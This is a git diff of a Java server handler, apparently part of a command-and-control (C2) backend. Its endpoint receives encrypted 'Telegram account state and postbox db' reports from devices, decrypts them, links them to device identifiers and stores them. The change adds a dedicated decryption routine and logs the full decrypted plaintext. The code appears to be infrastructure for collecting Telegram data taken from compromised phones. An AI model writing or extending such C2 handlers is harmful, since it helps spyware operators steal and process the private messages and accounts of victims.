@@ -12,7 +12,7 @@ import com.consume.service.C2HandlerContext;
 
 /**
  * POST /api/tg/t：Telegram 账号态 + postbox db 上报。
- * <p>解密 → 设备关联（ecid/unique/serial + channel）→ tg_report 入库。
+ * <p>解密（wp/tg 专用，对齐 encryptAck）→ 设备关联（ecid/unique/serial + channel）→ tg_report 入库。
  */
 @Component
 public class HandleTgT extends AbstractC2Handler {
@@ -33,8 +33,16 @@ public class HandleTgT extends AbstractC2Handler {
             return;
         }
         resolveDomain(ctx);
-        String plain = decrypt(ctx, "ecid", "unique", "serial", "channel", "user_id");
+        String plain = decryptWpTg(ctx, "ecid", "unique", "serial", "channel", "user_id");
         JSONObject pt = ctx.getPlaintext();
+        if (plain != null && !plain.isEmpty()) {
+            String dump = ctx.getRawText();
+            if (dump == null || dump.isEmpty()) {
+                dump = plain;
+            }
+            log.info("正常日志:[c2_handlers] /api/tg/t 解密明文完整内容, id={}, len={}, plaintext={}",
+                    ctx.getRecordId(), dump.length(), dump);
+        }
 
         String ecid = first(pt, "ecid", "d", "f");
         String unique = first(pt, "unique", "u");
@@ -48,7 +56,8 @@ public class HandleTgT extends AbstractC2Handler {
 
         store.saveTgReport(ctx, pt);
         if (plain == null || plain.isEmpty()) {
-            log.info("异常日志:[c2_handlers] /api/tg/t 解密失败或无明文, id={}", ctx.getRecordId());
+            log.info("异常日志:[c2_handlers] /api/tg/t 解密失败或无明文, id={}, err={}",
+                    ctx.getRecordId(), ctx.getDecryptError());
         } else if (rowId == null) {
             log.info("异常日志:[c2_handlers] /api/tg/t 无设备，已尽力写库/跳过, id={}, ecid={}",
                     ctx.getRecordId(), ecid);
